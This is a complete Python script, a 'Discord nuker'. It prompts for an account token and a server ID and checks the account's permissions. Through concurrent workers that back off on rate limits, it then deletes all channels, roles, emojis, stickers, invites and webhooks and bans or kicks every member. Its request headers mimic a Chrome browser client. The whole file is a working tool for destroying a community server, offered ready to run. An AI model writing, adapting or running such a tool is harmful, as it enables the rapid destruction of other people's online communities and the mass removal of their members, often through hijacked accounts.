import asyncio
import importlib.util
import os
import random
import signal
import sys
import time
from collections import deque

import httpx

Reset = "\033[0m"
Bold = "\033[1m"
Gray = "\033[90m"
White = "\033[37m"
BrightRed = "\033[91m"
BrightGreen = "\033[92m"
BrightYellow = "\033[93m"
BrightBlue = "\033[94m"
BrightMagenta = "\033[95m"
BrightCyan = "\033[96m"
Orange = "\033[38;5;208m"
Purple = "\033[38;5;135m"
Pink = "\033[38;5;213m"
Teal = "\033[38;5;51m"
Lime = "\033[38;5;154m"

Base = "https://discord.com/api/v10"
MaxRetries = 5
InitialWorkers = 50
MinWorkers = 25
MaxWorkers = 50
JitterMin = 0.001
JitterMax = 0.005
BackoffBase = 0.05
BackoffMax = 1.5

Stats: dict = {
    "done": 0,
    "already": 0,
    "failed": 0,
    "retries": 0,
    "rate_limits": 0,
    "start_time": 0.0,
}

StatsLock: asyncio.Lock | None = None
StopEvent: asyncio.Event | None = None


def SafePrint(Text, End="\n"):
    try:
        print(Text, end=End, flush=True)
    except UnicodeEncodeError:
        try:
            print(
                Text.encode("ascii", "ignore").decode("ascii"),
                end=End,
                flush=True,
            )
        except Exception:
            pass
    except Exception:
        pass


def Box(Title, Message, Color=None):
    if Color is None:
        Color = BrightCyan
    SafePrint("\r\033[K", End="")
    SafePrint("")
    SafePrint(
        f"{Purple}┌─ {Color}{Bold}{Title}{Reset} "
        f"{Purple}───────────────────────────────────────────────────┐{Reset}"
    )
    for Line in str(Message).split("\n"):
        SafePrint(f"{Purple}│{Reset} {Color}{Line}{Reset}")
    SafePrint(
        f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}"
    )
    SafePrint("")


def ErrorBox(Message):
    Box("Error", Message, BrightRed)


def InfoBox(Message):
    Box("Info", Message, BrightCyan)


def WarningBox(Message):
    Box("Warning", Message, BrightYellow)


def SafeClear():
    try:
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
    except Exception:
        pass


async def SafeSleep(Seconds):
    if Seconds < 0:
        Seconds = 0
    if Seconds > 120:
        Seconds = 120
    await asyncio.sleep(Seconds)


def SafeRandomUniform(A, B):
    try:
        if A > B:
            A, B = B, A
        return random.uniform(A, B)
    except Exception:
        return 0.001


def SafeInt(Value, Default=0):
    try:
        return int(Value)
    except (ValueError, TypeError):
        return Default


def SafeFloat(Value, Default=0.0):
    try:
        return float(Value)
    except (ValueError, TypeError):
        return Default


def SafeJson(Response):
    try:
        return Response.json()
    except Exception:
        return None


def SafeGet(D, Key, Default=None):
    if not isinstance(D, dict):
        return Default
    return D.get(Key, Default)


def SafeDiv(A, B, Default=0.0):
    if B == 0:
        return Default
    return A / B


def SafeMax(A, B):
    return A if A > B else B


def SafeMin(A, B):
    return A if A < B else B


def SafeInput(Prompt):
    try:
        return input(Prompt).strip()
    except (EOFError, KeyboardInterrupt, UnicodeDecodeError):
        return ""


def SafeGetpass(Prompt):
    try:
        import pwinput
        return pwinput.pwinput(prompt=Prompt, mask="*").strip()
    except ImportError:
        pass
    except Exception:
        pass
    try:
        import getpass
        return getpass.getpass(prompt=Prompt).strip()
    except Exception:
        return ""


def Backoff(Attempt):
    Exp = min(BackoffBase * (2 ** Attempt), BackoffMax)
    return Exp + SafeRandomUniform(JitterMin, JitterMax)


def IsMutating(Method):
    return Method.upper() in ("DELETE", "PUT", "POST", "PATCH")


def CheckH2():
    if importlib.util.find_spec("h2") is None:
        ErrorBox("Missing Dependency H2\nInstall It With: pip install httpx[http2]")
        return False
    return True


def CheckPwinput():
    if importlib.util.find_spec("pwinput") is None:
        ErrorBox("Missing Dependency Pwinput\nInstall It With: pip install pwinput")
        return False
    return True


class Nuker:
    def __init__(self, Token, GuildId):
        self.Token = Token
        self.GuildId = GuildId
        self.Headers = {
            "Authorization": Token,
            "Content-Type": "application/json",
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/134.0.0.0 Safari/537.36"
            ),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Super-Properties": (
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xv"
                "Y2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3"
                "MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgTGlrZSBH"
                "ZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjo"
                "iMTM0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIi"
                "wiY2xpZW50X2J1aWxkX251bWJlciI6MzAwMDAwfQ=="
            ),
        }
        self.Client: httpx.AsyncClient | None = None
        self.Queue: asyncio.Queue | None = None
        self.Cache: dict = {"channels": None, "roles": None}
        self.User: dict | None = None
        self.Guild: dict | None = None
        self.Permissions: int = 0
        self.IsOwner: bool = False
        self.IsAdmin: bool = False

    async def __aenter__(self):
        self.Queue = asyncio.Queue()
        Limits = httpx.Limits(
            max_connections=200,
            max_keepalive_connections=100,
            keepalive_expiry=60.0,
        )
        Timeout = httpx.Timeout(connect=3.0, read=10.0, write=10.0, pool=3.0)
        self.Client = httpx.AsyncClient(
            timeout=Timeout,
            limits=Limits,
            headers=self.Headers,
            http2=True,
            follow_redirects=True,
        )
        return self

    async def __aexit__(self, *Args):
        try:
            if self.Client:
                await self.Client.aclose()
        except Exception:
            pass

    async def ValidateToken(self):
        try:
            R = await self.Request("GET", f"{Base}/users/@me")
            if R is not None and R.status_code == 200:
                Data = SafeJson(R)
                if isinstance(Data, dict):
                    self.User = Data
                    return True
            return False
        except Exception:
            return False

    async def ValidateGuild(self):
        try:
            R = await self.Request("GET", f"{Base}/guilds/{self.GuildId}")
            if R is not None and R.status_code == 200:
                Data = SafeJson(R)
                if isinstance(Data, dict):
                    self.Guild = Data
                    return True
            return False
        except Exception:
            return False

    async def ValidatePermissions(self):
        try:
            if not self.Guild or not self.User:
                return False

            MyId = SafeGet(self.User, "id")
            if not MyId:
                return False

            if SafeGet(self.Guild, "owner_id") == MyId:
                self.IsOwner = True
                self.IsAdmin = True
                self.Permissions = 0xFFFFFFFFFFFFFFFF
                return True

            R = await self.Request("GET", f"{Base}/guilds/{self.GuildId}/roles")
            if R is None:
                return False

            if R.status_code != 200:
                return False

            AllRoles = SafeJson(R)
            if not isinstance(AllRoles, list):
                return False

            R2 = await self.Request(
                "GET", f"{Base}/guilds/{self.GuildId}/members/{MyId}"
            )
            if R2 is None:
                return False

            if R2.status_code != 200:
                self.Permissions = 0
                self.IsAdmin = False
                return True

            Member = SafeJson(R2)
            if not isinstance(Member, dict):
                self.Permissions = 0
                self.IsAdmin = False
                return True

            MyRoles = set(SafeGet(Member, "roles", []))
            Perms = 0

            for Role in AllRoles:
                if not isinstance(Role, dict):
                    continue
                Rid = SafeGet(Role, "id")
                if not Rid:
                    continue
                Rperm = SafeInt(SafeGet(Role, "permissions", 0), 0)
                if Rid == self.GuildId:
                    Perms |= Rperm
                elif Rid in MyRoles:
                    Perms |= Rperm

            self.Permissions = Perms
            self.IsAdmin = bool(Perms & 0x8)
            return True
        except Exception:
            return False

    async def ValidateAll(self):
        SafePrint("")
        SafePrint(
            f"{Purple}┌─ {BrightMagenta}{Bold}Validation{Reset} "
            f"{Purple}───────────────────────────────────────────────┐{Reset}"
        )

        if not self.Token:
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Token: Required{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False

        if not await self.ValidateToken():
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Token: Invalid{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False

        SafePrint(
            f"{Purple}│{Reset} {BrightGreen}✔ Token: {Teal}{Bold}"
            f"{SafeGet(self.User, 'username', 'Unknown')}"
            f"#{SafeGet(self.User, 'discriminator', '0')}{Reset}"
        )

        if not self.GuildId:
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: Required{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False

        if not await self.ValidateGuild():
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Guild: Not Found{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False

        SafePrint(
            f"{Purple}│{Reset} {BrightGreen}✔ Guild: {Teal}{Bold}"
            f"{SafeGet(self.Guild, 'name', 'Unknown')}{Reset}"
        )

        if not await self.ValidatePermissions():
            SafePrint(f"{Purple}│{Reset} {BrightRed}✘ Permissions: Could Not Fetch{Reset}")
            SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
            return False

        if self.IsOwner:
            SafePrint(
                f"{Purple}│{Reset} {BrightGreen}✔ Permissions: "
                f"{Teal}{Bold}Owner{Reset}"
            )
        elif self.IsAdmin:
            SafePrint(
                f"{Purple}│{Reset} {BrightGreen}✔ Permissions: "
                f"{Teal}{Bold}Administrator{Reset}"
            )
        else:
            SafePrint(
                f"{Purple}│{Reset} {BrightYellow}⚠ Permissions: "
                f"{Teal}{Bold}Limited (0x{self.Permissions:X}){Reset}"
            )

        SafePrint(f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}")
        return True

    async def Request(self, Method, Url, Json=None):
        try:
            if StopEvent is None or StopEvent.is_set():
                return None

            Mutating = IsMutating(Method)

            for Attempt in range(MaxRetries):
                if StopEvent is None or StopEvent.is_set():
                    return None

                try:
                    R = await self.Client.request(Method, Url, json=Json)
                except (httpx.RequestError, asyncio.TimeoutError):
                    async with StatsLock:
                        Stats["retries"] += 1
                    await SafeSleep(Backoff(Attempt))
                    continue
                except Exception:
                    return None

                Status = R.status_code

                if Status in (200, 201, 204):
                    if Mutating:
                        async with StatsLock:
                            Stats["done"] += 1
                    return R

                if Status == 404:
                    if Mutating:
                        async with StatsLock:
                            Stats["already"] += 1
                    return R

                if Status == 429:
                    Body = SafeJson(R) or {}
                    if not isinstance(Body, dict):
                        Body = {}
                    RetryAfter = SafeFloat(Body.get("retry_after", 1.0), 1.0)
                    Scope = R.headers.get("X-RateLimit-Scope", "")
                    try:
                        if R.headers.get("Retry-After"):
                            RetryAfter = max(
                                RetryAfter,
                                SafeFloat(R.headers["Retry-After"], RetryAfter),
                            )
                    except Exception:
                        pass
                    IsGlobal = bool(Body.get("global", False)) or Scope == "global"
                    async with StatsLock:
                        Stats["rate_limits"] += 1
                        Stats["retries"] += 1
                    SleepTime = RetryAfter + SafeRandomUniform(JitterMin, JitterMax)
                    if IsGlobal:
                        WarningBox(f"Global Rate Limit — Sleeping {SleepTime:.2f}s")
                    await asyncio.sleep(min(SleepTime, 300.0))
                    continue

                if Status in (401, 403):
                    if Mutating:
                        async with StatsLock:
                            Stats["failed"] += 1
                    return R

                if Status in (500, 502, 503, 504):
                    async with StatsLock:
                        Stats["retries"] += 1
                    await SafeSleep(Backoff(Attempt))
                    continue

                if Mutating:
                    async with StatsLock:
                        Stats["failed"] += 1
                return R

            if Mutating:
                async with StatsLock:
                    Stats["failed"] += 1
            return None
        except Exception:
            return None

    async def GetChannels(self):
        if self.Cache["channels"] is not None:
            return self.Cache["channels"]
        R = await self.Request("GET", f"{Base}/guilds/{self.GuildId}/channels")
        if R is not None and R.status_code == 200:
            Data = SafeJson(R)
            if isinstance(Data, list):
                self.Cache["channels"] = Data
                return self.Cache["channels"]
        return []

    async def GetRoles(self):
        if self.Cache["roles"] is not None:
            return self.Cache["roles"]
        R = await self.Request("GET", f"{Base}/guilds/{self.GuildId}/roles")
        if R is not None and R.status_code == 200:
            Data = SafeJson(R)
            if isinstance(Data, list):
                self.Cache["roles"] = Data
                return self.Cache["roles"]
        return []

    async def IterMembers(self):
        After = "0"
        ConsecutiveErrors = 0
        MaxConsecutiveErrors = 3

        while True:
            if StopEvent is None or StopEvent.is_set():
                return

            R = await self.Request(
                "GET",
                f"{Base}/guilds/{self.GuildId}/members?limit=1000&after={After}",
            )

            if not R:
                return

            if R.status_code == 403:
                return

            if R.status_code != 200:
                ConsecutiveErrors += 1
                if ConsecutiveErrors >= MaxConsecutiveErrors:
                    return
                await SafeSleep(Backoff(ConsecutiveErrors))
                continue

            ConsecutiveErrors = 0

            Batch = SafeJson(R)
            if not isinstance(Batch, list) or not Batch:
                return

            for M in Batch:
                yield M

            try:
                LastUserId = Batch[-1]["user"]["id"]
            except (KeyError, TypeError, IndexError):
                return

            After = LastUserId
            if len(Batch) < 1000:
                return


class WorkerPool:
    def __init__(self, NukerInstance):
        self.Nuker = NukerInstance
        self.CurrentWorkers = InitialWorkers
        self.Tasks: deque = deque()
        self.PoolLock = asyncio.Lock()
        self._LastAutotuneLog: float = 0.0

    async def Worker(self, Stagger=0.0):
        try:
            if Stagger > 0:
                try:
                    await SafeSleep(Stagger)
                except asyncio.CancelledError:
                    return

            while True:
                if StopEvent is None or StopEvent.is_set():
                    return

                try:
                    Method, Url, Payload = await asyncio.wait_for(
                        self.Nuker.Queue.get(), timeout=1.0
                    )
                except asyncio.TimeoutError:
                    continue
                except asyncio.CancelledError:
                    return

                try:
                    await self.Nuker.Request(Method, Url, Payload)
                except asyncio.CancelledError:
                    raise
                except Exception:
                    pass
                finally:
                    try:
                        self.Nuker.Queue.task_done()
                    except Exception:
                        pass
        except asyncio.CancelledError:
            raise
        except Exception:
            return

    async def Start(self):
        for _ in range(self.CurrentWorkers):
            Stagger = SafeRandomUniform(0.0, 0.05)
            self.Tasks.append(asyncio.create_task(self.Worker(Stagger=Stagger)))

    async def Autotune(self):
        LastDone = 0
        LastRl = 0
        while True:
            if StopEvent is None or StopEvent.is_set():
                return

            try:
                await SafeSleep(1)
            except asyncio.CancelledError:
                return

            Now = time.time()

            async with StatsLock:
                Done = Stats["done"] - LastDone
                Rl = Stats["rate_limits"] - LastRl
                LastDone = Stats["done"]
                LastRl = Stats["rate_limits"]

            LogMsg = None
            async with self.PoolLock:
                LiveTasks = deque(T for T in self.Tasks if not T.done())
                self.Tasks = LiveTasks

                if Rl > Done * 0.3 and self.CurrentWorkers > MinWorkers:
                    NewCount = SafeMax(MinWorkers, int(self.CurrentWorkers * 0.8))
                    if NewCount < self.CurrentWorkers:
                        Excess = len(self.Tasks) - NewCount
                        for _ in range(SafeMax(0, Excess)):
                            try:
                                T = self.Tasks.pop()
                                T.cancel()
                            except Exception:
                                pass
                        Old = self.CurrentWorkers
                        self.CurrentWorkers = NewCount
                        if Now - self._LastAutotuneLog >= 5.0:
                            self._LastAutotuneLog = Now
                            LogMsg = f"Auto Tune Down — {Old} → {NewCount}"

                elif Rl == 0 and Done > 20 and self.CurrentWorkers < MaxWorkers:
                    NewCount = SafeMin(MaxWorkers, self.CurrentWorkers + 5)
                    ToSpawn = NewCount - len(self.Tasks)
                    for _ in range(SafeMax(0, ToSpawn)):
                        self.Tasks.append(
                            asyncio.create_task(
                                self.Worker(Stagger=SafeRandomUniform(0.0, 0.05))
                            )
                        )
                    Old = self.CurrentWorkers
                    self.CurrentWorkers = NewCount
                    if Now - self._LastAutotuneLog >= 5.0:
                        self._LastAutotuneLog = Now
                        LogMsg = f"Auto Tune Up — {Old} → {NewCount}"

            if LogMsg:
                InfoBox(LogMsg)

    async def Stop(self):
        async with self.PoolLock:
            TasksSnapshot = list(self.Tasks)
            self.Tasks.clear()

        for T in TasksSnapshot:
            try:
                T.cancel()
            except Exception:
                pass

        if TasksSnapshot:
            await asyncio.gather(*TasksSnapshot, return_exceptions=True)


def FmtBar(Done, Total, Width=30):
    if Width < 0:
        Width = 0
    if Width > 200:
        Width = 200
    if Total <= 0:
        return f"{Purple}[{' ' * Width}]{Reset}"
    Done = SafeMax(0, SafeMin(Done, Total))
    Filled = SafeMax(0, SafeMin(Width, int(Width * Done / Total)))
    Pct = SafeDiv(Done, Total, 0)
    Color = BrightRed if Pct < 0.33 else Orange if Pct < 0.66 else BrightGreen
    Bar = f"{Color}{'█' * Filled}{Purple}{'░' * (Width - Filled)}{Reset}"
    return f"{Purple}[{Reset}{Bar}{Purple}]{Reset}"


async def ProgressReporter(Total):
    LastDone = 0
    LastTime = time.time()
    while True:
        if StopEvent is None or StopEvent.is_set():
            return

        try:
            await SafeSleep(0.25)
        except asyncio.CancelledError:
            return

        Now = time.time()
        async with StatsLock:
            Done = Stats["done"]
            Already = Stats["already"]
            Failed = Stats["failed"]
            Retries = Stats["retries"]
            Rl = Stats["rate_limits"]

        Settled = Done + Already + Failed
        Delta = SafeMax(0, Settled - LastDone)
        Dt = SafeMax(0, Now - LastTime)
        Rate = SafeDiv(Delta, Dt, 0)
        LastDone = Settled
        LastTime = Now

        Bar = FmtBar(Settled, Total)
        Pct = SafeMax(
            0.0,
            SafeMin(100.0, SafeDiv(Settled, Total, 0) * 100 if Total else 0),
        )
        Remaining = SafeMax(0, Total - Settled)
        Eta = SafeDiv(Remaining, Rate, 0)

        Line = (
            f"{Bar} {Bold}{Teal}{Pct:5.1f}%{Reset} "
            f"{Purple}│{Reset} {BrightGreen}OK {Done}{Reset} "
            f"{Purple}│{Reset} {Gray}SKIP {Already}{Reset} "
            f"{Purple}│{Reset} {BrightRed}FAIL {Failed}{Reset} "
            f"{Purple}│{Reset} {BrightYellow}RL {Rl}{Reset} "
            f"{Purple}│{Reset} {Lime}RETRY {Retries}{Reset} "
            f"{Purple}│{Reset} {Pink}{Rate:5.1f}/s{Reset} "
            f"{Purple}│{Reset} {BrightBlue}ETA {Eta:5.0f}s{Reset}"
        )
        try:
            print(f"\r{Line}", end="", flush=True)
        except UnicodeEncodeError:
            pass


async def DeleteChannels(NukerInstance):
    Channels = await NukerInstance.GetChannels()
    if not Channels:
        ErrorBox("No Channels Found")
        return 0
    Categories = [C for C in Channels if SafeGet(C, "type") == 4]
    Others = [C for C in Channels if SafeGet(C, "type") != 4]
    Count = 0
    for C in Others + Categories:
        Cid = SafeGet(C, "id")
        if not Cid:
            continue
        NukerInstance.Queue.put_nowait(("DELETE", f"{Base}/channels/{Cid}", None))
        Count += 1
    if Count == 0:
        ErrorBox("No Channels Found")
    return Count


async def DeleteRoles(NukerInstance):
    Roles = await NukerInstance.GetRoles()
    if not Roles:
        ErrorBox("No Roles Found")
        return 0
    Count = 0
    for Role in Roles:
        if SafeGet(Role, "managed") or SafeGet(Role, "id") == NukerInstance.GuildId:
            continue
        Rid = SafeGet(Role, "id")
        if not Rid:
            continue
        NukerInstance.Queue.put_nowait(
            ("DELETE", f"{Base}/guilds/{NukerInstance.GuildId}/roles/{Rid}", None)
        )
        Count += 1
    if Count == 0:
        ErrorBox("No Roles Found")
    return Count


async def BanMembers(NukerInstance):
    MyId = SafeGet(NukerInstance.User, "id")
    OwnerId = SafeGet(NukerInstance.Guild, "owner_id")
    Count = 0
    async for M in NukerInstance.IterMembers():
        Uid = SafeGet(SafeGet(M, "user", {}), "id")
        if not Uid or Uid == MyId or Uid == OwnerId:
            continue
        NukerInstance.Queue.put_nowait(
            (
                "PUT",
                f"{Base}/guilds/{NukerInstance.GuildId}/bans/{Uid}",
                {"delete_message_seconds": 0},
            )
        )
        Count += 1
    if Count == 0:
        ErrorBox("No Members Found")
    return Count


async def KickMembers(NukerInstance):
    MyId = SafeGet(NukerInstance.User, "id")
    OwnerId = SafeGet(NukerInstance.Guild, "owner_id")
    Count = 0
    async for M in NukerInstance.IterMembers():
        Uid = SafeGet(SafeGet(M, "user", {}), "id")
        if not Uid or Uid == MyId or Uid == OwnerId:
            continue
        NukerInstance.Queue.put_nowait(
            ("DELETE", f"{Base}/guilds/{NukerInstance.GuildId}/members/{Uid}", None)
        )
        Count += 1
    if Count == 0:
        ErrorBox("No Members Found")
    return Count


async def DeleteEmojis(NukerInstance):
    R = await NukerInstance.Request("GET", f"{Base}/guilds/{NukerInstance.GuildId}/emojis")
    if not R or R.status_code != 200:
        return 0
    Emojis = SafeJson(R)
    if not isinstance(Emojis, list) or not Emojis:
        ErrorBox("No Emojis Found")
        return 0
    Count = 0
    for E in Emojis:
        Eid = SafeGet(E, "id")
        if not Eid:
            continue
        NukerInstance.Queue.put_nowait(
            ("DELETE", f"{Base}/guilds/{NukerInstance.GuildId}/emojis/{Eid}", None)
        )
        Count += 1
    return Count


async def DeleteStickers(NukerInstance):
    R = await NukerInstance.Request("GET", f"{Base}/guilds/{NukerInstance.GuildId}/stickers")
    if not R or R.status_code != 200:
        return 0
    Stickers = SafeJson(R)
    if not isinstance(Stickers, list) or not Stickers:
        ErrorBox("No Stickers Found")
        return 0
    Count = 0
    for S in Stickers:
        Sid = SafeGet(S, "id")
        if not Sid:
            continue
        NukerInstance.Queue.put_nowait(
            ("DELETE", f"{Base}/guilds/{NukerInstance.GuildId}/stickers/{Sid}", None)
        )
        Count += 1
    return Count


async def DeleteInvites(NukerInstance):
    R = await NukerInstance.Request("GET", f"{Base}/guilds/{NukerInstance.GuildId}/invites")
    if not R or R.status_code != 200:
        return 0
    Invites = SafeJson(R)
    if not isinstance(Invites, list) or not Invites:
        ErrorBox("No Invites Found")
        return 0
    Count = 0
    for Inv in Invites:
        Code = SafeGet(Inv, "code")
        if not Code:
            continue
        NukerInstance.Queue.put_nowait(("DELETE", f"{Base}/invites/{Code}", None))
        Count += 1
    return Count


async def DeleteWebhooks(NukerInstance):
    R = await NukerInstance.Request("GET", f"{Base}/guilds/{NukerInstance.GuildId}/webhooks")
    if not R or R.status_code != 200:
        return 0
    Webhooks = SafeJson(R)
    if not isinstance(Webhooks, list) or not Webhooks:
        ErrorBox("No Webhooks Found")
        return 0
    Count = 0
    for W in Webhooks:
        Wid = SafeGet(W, "id")
        if not Wid:
            continue
        NukerInstance.Queue.put_nowait(("DELETE", f"{Base}/webhooks/{Wid}", None))
        Count += 1
    return Count


Actions = {
    "1": ("Delete Channels & Categories", DeleteChannels),
    "2": ("Delete Roles", DeleteRoles),
    "3": ("Ban All Members", BanMembers),
    "4": ("Kick All Members", KickMembers),
    "5": ("Delete Emojis", DeleteEmojis),
    "6": ("Delete Stickers", DeleteStickers),
    "7": ("Delete Invites", DeleteInvites),
    "8": ("Delete Webhooks", DeleteWebhooks),
    "9": ("Run Everything", None),
}


async def RunAction(NukerInstance, Choice):
    if Choice == "9":
        Total = 0
        for Key in ["1", "2", "5", "6", "7", "8", "3"]:
            _, Fn = Actions[Key]
            Total += await Fn(NukerInstance)
        return Total

    _, Fn = Actions[Choice]
    if Fn is None:
        return 0
    return await Fn(NukerInstance)


def PrintActions():
    SafePrint("")
    SafePrint(
        f"{Purple}┌─ {BrightMagenta}{Bold}Mini Flay Discord Nuker{Reset} "
        f"{Purple}──────────────────────────────────────┐{Reset}"
    )
    SafePrint(f"{Purple}│{Reset} {Teal}Available Actions{Reset}")
    SafePrint(
        f"{Purple}├──────────────────────────────────────────────────────────┤{Reset}"
    )
    for Key in sorted(Actions.keys(), key=lambda K: int(K)):
        Name, _ = Actions[Key]
        if Key == "9":
            SafePrint(
                f"{Purple}│{Reset} {BrightRed}{Bold}[{Key}] {Name}{Reset}"
            )
        else:
            SafePrint(
                f"{Purple}│{Reset} {Lime}[{Key}]{Reset} {White}{Name}{Reset}"
            )
    SafePrint(
        f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}"
    )
    SafePrint("")


async def Main():
    global StatsLock, StopEvent

    if not CheckH2():
        return

    if not CheckPwinput():
        return

    StatsLock = asyncio.Lock()
    StopEvent = asyncio.Event()

    Stats.update(
        {
            "done": 0,
            "already": 0,
            "failed": 0,
            "retries": 0,
            "rate_limits": 0,
            "start_time": 0.0,
        }
    )

    SafeClear()

    SafePrint("")
    SafePrint(
        f"{Purple}┌─ {BrightMagenta}{Bold}Configuration{Reset} "
        f"{Purple}────────────────────────────────────────────┐{Reset}"
    )
    Token = SafeGetpass(
        f"{Purple}│{Reset} {Teal}Token{Reset}  {Purple}➜{Reset} "
    )
    GuildId = SafeInput(
        f"{Purple}│{Reset} {Teal}Guild{Reset}  {Purple}➜{Reset} "
    )
    SafePrint(
        f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}"
    )

    NukerInstance = Nuker(Token, GuildId)
    async with NukerInstance:
        if not await NukerInstance.ValidateAll():
            return

        PrintActions()
        Choice = SafeInput(
            f"  {Purple}➜{Reset} {Bold}Choose An Option:{Reset} "
        )

        if Choice not in Actions:
            ErrorBox("Invalid Option")
            return

        Stats["start_time"] = time.time()

        Total = await RunAction(NukerInstance, Choice)

        if Total == 0:
            return

        SafePrint("")
        SafePrint(
            f"{Purple}┌─ {BrightMagenta}{Bold}Queue{Reset} "
            f"{Purple}─────────────────────────────────────────────────┐{Reset}"
        )
        SafePrint(
            f"{Purple}│{Reset} Total Operations Queued: {Lime}{Bold}{Total}{Reset}"
        )
        SafePrint(
            f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}"
        )

        Pool = WorkerPool(NukerInstance)
        await Pool.Start()

        Reporter = asyncio.create_task(ProgressReporter(Total))
        AutotuneTask = asyncio.create_task(Pool.Autotune())

        try:
            await NukerInstance.Queue.join()
        finally:
            StopEvent.set()
            AutotuneTask.cancel()
            Reporter.cancel()
            await Pool.Stop()
            await asyncio.gather(AutotuneTask, Reporter, return_exceptions=True)
            SafePrint("")

        SafePrint("")
        Elapsed = time.time() - Stats["start_time"]
        Done = Stats["done"]
        Already = Stats["already"]
        Failed = Stats["failed"]
        Retries = Stats["retries"]
        Rl = Stats["rate_limits"]

        SafePrint(
            f"{Purple}┌─ {BrightMagenta}{Bold}Final Results{Reset} "
            f"{Purple}────────────────────────────────────────┐{Reset}"
        )
        SafePrint(
            f"{Purple}│{Reset} {BrightGreen}✔  Success   {Reset}: {Bold}{Done}/{Total}{Reset}"
        )
        SafePrint(
            f"{Purple}│{Reset} {Gray}↷  Skipped   {Reset}: {Bold}{Already}{Reset}"
        )
        SafePrint(
            f"{Purple}│{Reset} {BrightRed}✘  Failed    {Reset}: {Bold}{Failed}{Reset}"
        )
        SafePrint(
            f"{Purple}│{Reset} {BrightYellow}↻  Retries   {Reset}: {Bold}{Retries}{Reset}"
        )
        SafePrint(
            f"{Purple}│{Reset} {Lime}⏱  Rate Lmt  {Reset}: {Bold}{Rl}{Reset}"
        )
        SafePrint(
            f"{Purple}│{Reset} {Lime}⏲  Time      {Reset}: {Bold}{Elapsed:.2f}s{Reset}"
        )
        SafePrint(
            f"{Purple}│{Reset} {Pink}⚡  Avg Rate  {Reset}: "
            f"{Bold}{SafeDiv(Done, max(Elapsed, 0.01), 0):.1f}/s{Reset}"
        )
        SafePrint(
            f"{Purple}└──────────────────────────────────────────────────────────┘{Reset}"
        )


def SignalHandler(Sig, Frame):
    WarningBox("Interrupted — Shutting Down...")
    os._exit(1)


def RunMain():
    try:
        asyncio.get_running_loop()
        SafePrint(f"{BrightRed}Error: Cannot Run Inside An Existing Event Loop.{Reset}")
        return 1
    except RuntimeError:
        pass
    try:
        asyncio.run(Main())
        return 0
    except KeyboardInterrupt:
        return 130
    except RuntimeError:
        return 1
    except Exception:
        return 1


if __name__ == "__main__":
    try:
        signal.signal(signal.SIGINT, SignalHandler)
    except Exception:
        pass
    try:
        sys.exit(RunMain())
    except SystemExit:
        raise
    except Exception:
        pass
